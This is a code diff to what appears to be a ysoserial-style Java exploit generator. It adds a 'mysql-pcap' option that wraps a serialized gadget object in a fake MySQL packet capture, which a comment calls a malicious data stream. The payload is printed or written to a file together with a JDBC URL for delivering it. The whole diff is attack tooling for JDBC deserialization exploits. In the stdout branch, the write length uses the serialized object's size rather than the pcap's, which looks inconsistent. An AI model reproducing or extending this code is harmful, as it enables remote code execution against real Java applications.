@@ -6,6 +6,7 @@ import cn.butler.yso.Serializer;
 import cn.butler.yso.UTF8BytesMix;
 import cn.butler.payloads.config.Config;
 import cn.butler.yso.payloads.util.DirtyDataWrapper;
+import cn.butler.yso.utils.FakeMySQLPcapFile;
 import cn.butler.yso.utils.YsoUtils;
 import org.apache.commons.cli.CommandLine;
 import org.apache.shiro.lang.codec.Base64;
@@ -117,6 +118,24 @@ public class YsoConfig extends Config {
                 //最后进行Base64加密
                 String base64String = Base64.encodeToString(serialBytes);
                 System.out.println(base64String);
+                System.exit(0);
+            }
+
+            if(cmdLine.hasOption("mysql-pcap")){
+                String version = cmdLine.getOptionValue("mysql-pcap");
+                serialize = Serializer.serialize(object);
+                //生成恶意数据流
+                FakeMySQLPcapFile fakeMySQLPcapFile = new FakeMySQLPcapFile(version);
+                byte[] evilPcap = fakeMySQLPcapFile.makePcap(serialize);
+                //输出处理
+                if (cmdLine.hasOption("writeToFile")){
+                    String fileName = cmdLine.getOptionValue("writeToFile");
+                    System.out.println(fakeMySQLPcapFile.jdbc_url.replace("{filePath}",fileName));
+                    FileUtils.saveBytePayloadToFile(evilPcap,fileName);
+                    System.exit(0);
+                }
+                System.out.println(fakeMySQLPcapFile.jdbc_url);
+                System.out.write(evilPcap,0,serialize.length);
                 System.exit(0);
             }
 
